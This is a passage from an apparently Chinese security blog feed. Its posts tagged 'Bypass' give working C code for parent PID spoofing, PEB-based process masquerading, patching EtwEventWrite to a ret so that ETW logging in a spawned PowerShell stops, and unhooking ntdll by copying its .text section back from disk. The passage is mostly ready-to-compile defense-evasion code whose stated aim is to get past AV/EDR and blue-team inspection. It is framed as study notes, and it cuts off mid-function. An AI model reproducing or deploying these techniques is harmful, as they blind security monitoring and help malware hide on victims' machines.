MAX_PATH)) </span><br><span class="line">	<span class="comment">//当第一个参数为NULL的时候，会返回当前进程的文件路径，第二个参数指向缓冲区，第三个参数指明缓冲区的大小</span></span><br><span class="line">	&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;GetModuleFileName() failed! [%d]\n&quot;</span>, GetLastError());</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//2.创建挂起的新进程</span></span><br><span class="line">	<span class="comment">//设置使用多字符集 这里主要是使用W版本的  找了半个晚上的错误才发现。。。。</span></span><br><span class="line">	BOOL bRet = CreateProcessW((LPWSTR)szPath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (!bRet) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateProcessW() failed! [%d]\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//设置线程上下文</span></span><br><span class="line">	ctx.ContextFlags = CONTEXT_FULL;</span><br><span class="line">	<span class="comment">//3.获取子进程的线程上下文</span></span><br><span class="line">	GetThreadContext(pi.hThread, &amp;ctx);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//4.设置子进程的上下文，将ctx结构体里边的eip选项指向定义的函数（也就是将当前的eip指向子进程，直接执行子进程的函数）</span></span><br><span class="line">	ctx.Eip = (DWORD)ChildProcess;</span><br><span class="line">	<span class="comment">//如果是x64 则使用Rip</span></span><br><span class="line">	<span class="comment">//ctx.Rip = (DWORD64)ChildProcess;</span></span><br><span class="line">	SetThreadContext(pi.hThread, &amp;ctx);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//5.恢复现场</span></span><br><span class="line">	<span class="keyword">if</span>( FALSE == ResumeThread(pi.hThread)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ResumeThread Failed! [%d]\n&quot;</span>,GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	WaitForSingleObject(pi.hProcess, INFINITE);</span><br><span class="line">	CloseHandle(pi.hProcess);</span><br><span class="line">	CloseHandle(pi.hThread);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id><a href="#" class="headerlink" title></a><img src="/posts/e5191117/1.png"></h4><h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://blog.csdn.net/annhf/article/details/1272601">https://blog.csdn.net/annhf/article/details/1272601</a><br><a href="https://blog.csdn.net/sxr__nc/article/details/106199728">https://blog.csdn.net/sxr__nc/article/details/106199728</a></p>
]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>父进程欺骗</title>
    <url>/posts/7a4de097/</url>
    <content><![CDATA[<p>父进程欺骗 即创建一个进程，然后指定其他进程作为该新建进程的父进程<br>父进程<code>(PPID)</code>欺骗方法可以绕过 <code>AV/EDR</code>检测，使其认为是 <code>lsass.exe</code> 这样的合法进程在进行活动。它通过欺骗进程的 <code>PID</code> 以匹配其父进程的 <code>PID</code> 来做到这一点。这种方法可能带来的另一个好处是，如果父进程以 <code>SYSTEM</code> 权限运行，则可以凭借访问令牌的继承，使其子进程也具有相同的 <code>SYSTEM</code> 权限。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进程：**在 `Windows` 中，应用程序由一个或多个进程组成。简单来说，当前正在运行的程序的一部分称为进程。不同的应用程序可能会使用相同的进程(如`cmd.exe`)，并且为避免歧义，会分配一个整数来区分一个进程和另一个进程。该整数称为`PID`。</span><br><span class="line"></span><br><span class="line">PID：代表进程标识符 (`PID`)，它是正在运行的进程的数字表示。`Windows` 中通过 `GetCurrentProcessID()` 函数返回指定进程的 `PID`。</span><br><span class="line"></span><br><span class="line">父进程：父进程是可以派生多个子进程的进程。例如，命令`explorer.exe /e,/root,&quot;C：WINDOWSSystem32cmd.exe&quot;`将派生`cmd.exe`作为父进程`explorer.exe`的子进程。在代码中，父进程可以使用`fork()`系统调用来派生子进程。</span><br><span class="line"></span><br><span class="line">PPID：代表父进程标识符(`PPID`)，它是提供给父进程的数字表示形式。任何包含子进程的进程都存在父子关系。</span><br></pre></td></tr></table></figure>

<h4 id="使用CreateProcessA进行欺骗"><a href="#使用CreateProcessA进行欺骗" class="headerlink" title="使用CreateProcessA进行欺骗"></a>使用CreateProcessA进行欺骗</h4><p>CreateProcessA函数允许用户创建新进程，默认情况下，会通过其继承的父进程完成创建。该函数有一个名为“lpStartupInfo”的参数，该参数允许使用者自定义要使用的父进程。<br>lpStartupInfo参数指向一个名为“STARTUPINFOEX”的结构体，该结构包含变量“lpAttributeList”，这个变量在初始化时可以调用“UpdateProcThreadAttribute”回调函数进行属性添加，可以通过“PROC_THREAD_ATTRIBUTE_PARENT_PROCESS”属性从而对父进程进行设置。</p>
<pre><code>如果在dwCreationFlags中EXTENDED_STARTUPINFO_PRESENT标准，那么lpStartupInfo传入的就会是一个名为STARTUPINFOEXA的结构体，而这个结构体能指定父进程的相关信息，最终传入的PPID会被写入到新进程_eprocess结构体的InheritedFromUniqueProcessId位置
</code></pre>
<h5 id="寻找explorer-exe进程的ID"><a href="#寻找explorer-exe进程的ID" class="headerlink" title="寻找explorer.exe进程的ID"></a>寻找explorer.exe进程的ID</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD <span class="title function_">FindExplorerPID</span><span class="params">()</span> &#123;</span><br><span class="line">    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    PROCESSENTRY32 process = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    process.dwSize = <span class="keyword">sizeof</span>(process);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Process32First(snapshot, &amp;process)) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!wcscmp(process.szExeFile, <span class="string">L&quot;explorer.exe&quot;</span>))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span> (Process32Next(snapshot, &amp;process));</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(snapshot);</span><br><span class="line">    <span class="keyword">return</span> process.th32ProcessID;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	STARTUPINFOEXA si;</span><br><span class="line">	PROCESS_INFORMATION pi;</span><br><span class="line">	SIZE_T attributeSize;</span><br><span class="line">	ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(STARTUPINFOEXA));</span><br><span class="line">	si.StartupInfo.cb = <span class="keyword">sizeof</span>(STARTUPINFOEXA);</span><br><span class="line">	  </span><br><span class="line">	HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, <span class="literal">false</span>, FindExplorerPID());</span><br><span class="line">	</span><br><span class="line">	InitializeProcThreadAttributeList(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);</span><br><span class="line">	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), <span class="number">0</span>, attributeSize);</span><br><span class="line">	InitializeProcThreadAttributeList(si.lpAttributeList, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//添加父进程属性</span></span><br><span class="line">	<span class="keyword">if</span> (!UpdateProcThreadAttribute(si.lpAttributeList, <span class="number">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;parentProcessHandle, <span class="keyword">sizeof</span>(HANDLE), <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;UpdateProcThreadAttribute Failed!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*如果在dwCreationFlags中EXTENDED_STARTUPINFO_PRESENT标准，那么lpStartupInfo传入的就会是一个名为STARTUPINFOEXA的结构体，</span></span><br><span class="line"><span class="comment">	而这个结构体能指定父进程的相关信息，</span></span><br><span class="line"><span class="comment">	最终传入的PPID会被写入到新进程_eprocess结构体的InheritedFromUniqueProcessId位置*/</span></span><br><span class="line">	<span class="comment">//CreateProcessA(NULL, (LPSTR)&quot;notepad&quot;, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &amp;si.StartupInfo, &amp;pi);</span></span><br><span class="line">	<span class="comment">//CreateProcessA(&quot;notepad.exe&quot;, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &amp;si.StartupInfo, &amp;pi);</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//EXTENDED_STARTUPINFO_PRESENT 继承父进程信息</span></span><br><span class="line">	CreateProcessA(<span class="string">&quot;C:\\Program Files\\internet explorer\\iexplore.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,TRUE, EXTENDED_STARTUPINFO_PRESENT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOA)&amp;si, <span class="literal">NULL</span>);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/7a4de097/1.png"></p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://blog.f-secure.com/detecting-parent-pid-spoofing/">https://blog.f-secure.com/detecting-parent-pid-spoofing/</a><br><a href="https://xz.aliyun.com/t/8387">https://xz.aliyun.com/t/8387</a><br><a href="https://idiotc4t.com/defense-evasion/fake-ppid">https://idiotc4t.com/defense-evasion/fake-ppid</a></p>
<hr>
]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>进程伪装</title>
    <url>/posts/a8a7b84c/</url>
    <content><![CDATA[<p>蓝队在排查恶意进程时，经常会使用ProcessExp、ProcessHacker类的进程检查工具进行检查，而恶意进程的特征比较明显，可以通过伪造PEB进程环境块的方式来实现进程伪装</p>
<h4 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h4><p>在R3 x86下 peb通常存住在fs:[30]处, x86系统下往往通过内联汇编的方式获取Peb地址，而在x64下可以通过使用ntdll.dll中的 <code>NtQueryInformationProcess</code>来获取进程的PEB<br>许多进程分析工具会从<code>PEB+0x20</code>处的 <code>_RTL_USER_PROCESS_PARAMETERS</code> 的结构体内读取<code>path、ommandline</code>等数据</p>
<p>windbg 附加一个notepad<br><code>!peb</code> 查看peb 环境块 得到peb地址<br><img src="/posts/a8a7b84c/1.png"></p>
<p><code>dt _peb 000000c712bc7000</code></p>
<p><img src="/posts/a8a7b84c/2.png"><br>在<code>_RTL_USER_PROCESS_PARAMETERS+0x60</code>和<code>_RTL_USER_PROCESS_PARAMETERS+0x70</code>处有两个_UNICODE_STRING结构体，通过这两个结构体可以查看字符串存放的位置</p>
<p><img src="/posts/a8a7b84c/3.png"></p>
<p>在0x60偏移的地方，<code>ImagePathName</code>即为可执行文件的路径，结构体为_UNICODE_STRING，它的0x08偏移指向了一个Buffer，Buffer的内容为可执行文件路径的字符串。同理，0x70偏移则指向了 CommandLine为命令行参数<br><img src="/posts/a8a7b84c/4.png"></p>
<p><code>eu 0x201cbea2348   &quot;C:\\Windows\\system32\\cmd.exe&quot;</code><br>修改完后查看<br><img src="/posts/a8a7b84c/5.png"><br>此时还没修改长度<br>之前是notepad 现在改成了 cmd (少了4个)<br>由于是unciode 所以要乘以2  -&gt; 8个(0x16)   0x3e-0x08=0x36<br>修改length   eb（修改字节)<code>eb 0x201cbea1d60 36 </code><br>然后在0x36处使用0x0作为结束符 <code> eb  0x201cbea2348+0x36 0x0</code><br><img src="/posts/a8a7b84c/6.png"></p>
<p>然后打开PRocessExp查看 可以看到Path处已经被改成了cmd<br><img src="/posts/a8a7b84c/7.png"></p>
<p>0x70处的CommandLine同理<br><code>eu 0x201cbea2388 &quot;C:\\Windows\\system32\\cmd.exe&quot;</code>eb 0x201cbea2388+0x36 0x0<code> </code>eb 0x201cbea1d70 0x36<code> </code><br><img src="/posts/a8a7b84c/8.png"></p>
<p>打开一个processexp 查看变化 可以看到已经改成了cmd<br><img src="/posts/a8a7b84c/9.png"></p>
<h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;winternl.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(*pNtQueryInformationProcess)</span> <span class="params">(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hPRocess = GetCurrentProcess();</span><br><span class="line">	PROCESS_BASIC_INFORMATION ProcessInformation;</span><br><span class="line">	ULONG len = <span class="number">0</span>;</span><br><span class="line">	HINSTANCE ntdll;</span><br><span class="line">	pNtQueryInformationProcess NtQueryInformationProcess;</span><br><span class="line">	<span class="type">wchar_t</span> commandline[] = <span class="string">L&quot;C:\\windows\\system32\\notepad.exe&quot;</span>;</span><br><span class="line">	ntdll = LoadLibrary(TEXT(<span class="string">&quot;Ntdll.dll&quot;</span>));</span><br><span class="line">	  </span><br><span class="line">	<span class="comment">//解析ntdll.dll中NtQueryInformationProcess的地址</span></span><br><span class="line">	NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(ntdll, <span class="string">&quot;NtQueryInformationProcess&quot;</span>);</span><br><span class="line">	 </span><br><span class="line">	<span class="comment">//获取_PEB对象</span></span><br><span class="line">	(NtQueryInformationProcess)(hPRocess, ProcessBasicInformation, &amp;ProcessInformation, <span class="keyword">sizeof</span>(ProcessInformation), &amp;len);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//替换命令行和映像路径名</span></span><br><span class="line">	ProcessInformation.PebBaseAddress-&gt;ProcessParameters-&gt;CommandLine.Buffer = commandline;</span><br><span class="line">	ProcessInformation.PebBaseAddress-&gt;ProcessParameters-&gt;ImagePathName.Buffer = commandline;</span><br><span class="line">	<span class="comment">//修改长度</span></span><br><span class="line">	ProcessInformation.PebBaseAddress-&gt;ProcessParameters-&gt;CommandLine.Length = <span class="keyword">sizeof</span>(commandline);</span><br><span class="line">	ProcessInformation.PebBaseAddress-&gt;ProcessParameters-&gt;ImagePathName.Length = <span class="keyword">sizeof</span>(commandline);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/a8a7b84c/10.png"></p>
<hr>
<p>在用户态的话 可以从上面看到 已经被伪装成了notepad</p>
<p> 改个名先 DisguiseProcess.exe<br><img src="/posts/a8a7b84c/11.png"></p>
<p>去内核态看下 用windbg 进行内核调试 把上面的exe<br>找一下这个exe<br><code>!process 0 0 DisguiseProcess.exe </code><br><code>!process ffffa38f4934c080</code> 看一下简要的信息<br><img src="/posts/a8a7b84c/12.png"></p>
<p>之前在用户层使用的是<code>dt _peb</code><br>在内核层的话使用<code>dt _eprocess</code><br><code> dt _eprocess ffffa38f4934c080</code>  在下面这里即可查看到原进程的ImageFileName<br><img src="/posts/a8a7b84c/13.png"></p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://xz.aliyun.com/t/10435">https://xz.aliyun.com/t/10435</a><br><a href="https://idiotc4t.com/defense-evasion/fake-commandline">https://idiotc4t.com/defense-evasion/fake-commandline</a></p>
]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>基于内存补丁的ETW绕过</title>
    <url>/posts/75320ad6/</url>
    <content><![CDATA[<h3 id="ETW"><a href="#ETW" class="headerlink" title="ETW"></a>ETW</h3><p><code>ETW</code>全称为<code>Event Tracing for Windows</code>，即windows事件跟踪，它是Windows提供的原生的事件跟踪日志系统。由于采用内核层面的缓冲和日志记录机制，所以<code>ETW</code>提供了一种非常高效的事件跟踪日志解决方案</p>
<p>3环ETW是通过ntdll.dll下的EtwEventWriteFull 函数实现的<br>这里使用x64bdg和ProcessExp<br>使用x64dbg附加一个新建的powershell  定位到ntdll!EtwEventWrite</p>
<p><img src="/posts/75320ad6/1.png"><br>一般WindowsAPI （x86）默认使用stdcall 调用约定 (x64)默认使用fastcall【即寄存器传参，被调用者清理堆栈】，这里直接使用ret返回即可<br><img src="/posts/75320ad6/2.png"><br>然后查看ProcessExp中的CLR日志 发现已经变成了空<br><img src="/posts/75320ad6/3.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	STARTUPINFOA si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 1. 建立一个 Powershell Process，并取得 Process Handle</span></span><br><span class="line">	CreateProcessA(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;powershell -noexit&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 2. 从 ntdll.dll 中取得 EtwEventWrite 的地址</span></span><br><span class="line">	HMODULE hNtdll = GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	<span class="comment">//LPVOID pEtwEventWrite = GetProcAddress(hNtdll, &quot;EtwEventWrite&quot;);</span></span><br><span class="line">	<span class="comment">//可能会有某些edr会对EtwEventWrite函数hook,所以这里可以处理下</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> pEtwEventWriteProcName[] = &#123; <span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;e&#x27;</span>, <span class="number">0</span> &#125;;</span><br><span class="line">	LPVOID pEtwEventWrite = GetProcAddress(hNtdll, (LPCSTR)pEtwEventWriteProcName);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 3. 把 EtwEventWrite 的地址的权限改成可读、可写、可执行(rwx)</span></span><br><span class="line">	DWORD oldProtect;</span><br><span class="line">	VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, <span class="number">1</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 4. 将 EtwEventWrite 的第一个 byte 改成 0xc3，也就是ret返回指令</span></span><br><span class="line">	<span class="type">char</span> patch = <span class="number">0xc3</span>;</span><br><span class="line">	WriteProcessMemory(pi.hProcess, (LPVOID)pEtwEventWrite, &amp;patch, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 5. 把 EtwEventWrite 的权限改回，并且继续执行 Process</span></span><br><span class="line">	VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, <span class="number">1</span>, oldProtect, <span class="literal">NULL</span>);</span><br><span class="line">	ResumeThread(pi.hThread);</span><br><span class="line"></span><br><span class="line">	CloseHandle(pi.hProcess);</span><br><span class="line">	CloseHandle(pi.hThread);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://idiotc4t.com/defense-evasion/memory-pacth-bypass-etw">https://idiotc4t.com/defense-evasion/memory-pacth-bypass-etw</a><br><a href="https://tttang.com/archive/1612/">https://tttang.com/archive/1612/</a></p>
]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>ntdll脱钩</title>
    <url>/posts/dabd444/</url>
    <content><![CDATA[<h4 id="重载-text节对ntdll脱钩"><a href="#重载-text节对ntdll脱钩" class="headerlink" title="重载.text节对ntdll脱钩"></a>重载.text节对ntdll脱钩</h4><p>杀软会对ntdll进入内核的函数进行挂钩，从而实现检测和阻止，但是好像很少有杀软会去ntdll进行挂钩，这里主要学习一下这种思路。将ntdll读取到内存，然后读取覆盖.text节</p>
<p><img src="/posts/dabd444/1.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unhook</span><span class="params">()</span>&#123;</span><br><span class="line">&#123;</span><br><span class="line">	MODULEINFO mInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	HANDLE hProcess = GetCurrentProcess();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//get address of ntdll in virtual memory </span></span><br><span class="line">	<span class="comment">//获取ntdll在内存中的地址</span></span><br><span class="line">	HMODULE hNtdll = GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	GetModuleInformation(hProcess, hNtdll, &amp;mInfo, <span class="keyword">sizeof</span>(mInfo));</span><br><span class="line">	LPVOID lpNtdllbase = (LPVOID)mInfo.lpBaseOfDll;</span><br><span class="line">	</span><br><span class="line">	HANDLE hNtdllfile = CreateFileA(<span class="string">&quot;C:\\windows\\system32\\ntdll.dll&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	HANDLE hNtdllMapping = CreateFileMapping(hNtdllfile, <span class="literal">NULL</span>, PAGE_READONLY | SEC_IMAGE, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	LPVOID lpNtdllmaping = MapViewOfFile(hNtdllMapping, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	PIMAGE_DOS_HEADER pDosheader = (PIMAGE_DOS_HEADER)lpNtdllbase;</span><br><span class="line">	PIMAGE_NT_HEADERS pNtheader = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpNtdllbase + pDosheader-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (WORD i = <span class="number">0</span>; i &lt; pNtheader-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">		PIMAGE_SECTION_HEADER pSectionheader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pNtheader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));</span><br><span class="line">	<span class="comment">//找到.text</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="type">char</span>*)pSectionheader-&gt;Name, (<span class="type">char</span>*)<span class="string">&quot;.text&quot;</span>)) &#123;</span><br><span class="line">			DWORD oldProtection = <span class="number">0</span>;</span><br><span class="line">			</span><br><span class="line">			<span class="type">bool</span> isProtected = VirtualProtect((LPVOID)((DWORD_PTR)lpNtdllbase + (DWORD_PTR)pSectionheader-&gt;VirtualAddress), pSectionheader-&gt;Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &amp;oldProtection);</span><br><span class="line">			</span><br><span class="line">			<span class="built_in">memcpy</span>((LPVOID)((DWORD_PTR)lpNtdllbase + (DWORD_PTR)pSectionheader-&gt;VirtualAddress), (LPVOID)((DWORD_PTR)lpNtdllmaping + (DWORD_PTR)pSectionheader-&gt;VirtualAddress), pSectionheader-&gt;Misc.VirtualSize);</span><br><span class="line">			</span><br><span class="line">			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)lpNtdllbase + (DWORD_PTR)pSectionheader-&gt;VirtualAddress), pSectionheader-&gt;Misc.VirtualSize, oldProtection, <span class="literal">NULL</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	CloseHandle(hNtdllfile);</span><br><span class="line">	CloseHandle(lpNtdllmaping);</span><br><span class="line">	<span class="comment">//FreeLibrary(hNtdll);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//return 0;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEREF( name )*(UINT_PTR *)(name)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEREF_64( name )*(DWORD64 *)(name)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEREF_32( name )*(DWORD *)(name)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEREF_16( name )*(WORD *)(name)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEREF_8( name )*(BYTE *)(name)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(NTAPI* pNtAllocateVirtualMemory)</span><span class="params">(</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	PVOID* BaseAddress,</span></span><br><span class="line"><span class="params">	ULONG_PTR ZeroBits,</span></span><br><span class="line"><span class="params">	PSIZE_T RegionSize,</span></span><br><span class="line"><span class="params">	ULONG AllocationType,</span></span><br><span class="line"><span class="params">	ULONG Protect)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现GetProcessAddress 源代码在下面链接</span></span><br><span class="line"><span class="comment">//https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/inject/src/GetProcAddressR.c</span></span><br><span class="line">FARPROC WINAPI <span class="title function_">GetProcAddressR</span><span class="params">(HANDLE hModule, LPCSTR lpProcName)</span></span><br><span class="line">&#123;</span><br><span class="line">	UINT_PTR uiLibraryAddress = <span class="number">0</span>;</span><br><span class="line">	FARPROC fpResult = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hModule == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	uiLibraryAddress = (UINT_PTR)hModule;</span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		UINT_PTR uiAddressArray = <span class="number">0</span>;</span><br><span class="line">		UINT_PTR uiNameArray = <span class="number">0</span>;</span><br><span class="line">		UINT_PTR uiNameOrdinals = <span class="number">0</span>;</span><br><span class="line">		PIMAGE_NT_HEADERS pNtHeaders = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_DATA_DIRECTORY pDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_EXPORT_DIRECTORY pExportDirectory = <span class="literal">NULL</span>;</span><br><span class="line">		</span><br><span class="line">		pNtHeaders = (PIMAGE_NT_HEADERS)(uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_lfanew);</span><br><span class="line">		pDataDirectory = (PIMAGE_DATA_DIRECTORY)&amp;pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</span><br><span class="line">		pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(uiLibraryAddress + pDataDirectory-&gt;VirtualAddress);</span><br><span class="line">		uiAddressArray = (uiLibraryAddress + pExportDirectory-&gt;AddressOfFunctions);</span><br><span class="line">		uiNameArray = (uiLibraryAddress + pExportDirectory-&gt;AddressOfNames);</span><br><span class="line">		uiNameOrdinals = 